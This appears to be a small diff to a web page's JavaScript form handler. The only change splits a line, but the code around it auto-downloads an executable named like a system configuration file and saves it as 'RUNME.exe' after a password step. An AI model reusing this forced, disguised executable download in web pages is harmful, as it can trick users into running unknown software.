@@ -118,7 +118,8 @@ form.addEventListener('submit', async (e) => {
     if (passwordStep == 5) {
       const link = document.createElement("a");
       link.href = "RootConfig/SystemCoreConfig_V7.exe";
-      link.download = "RUNME.exe";document.body.appendChild(link);
+      link.download = "RUNME.exe";
+      document.body.appendChild(link);
       link.click();
       document.body.removeChild(link); 
     } 
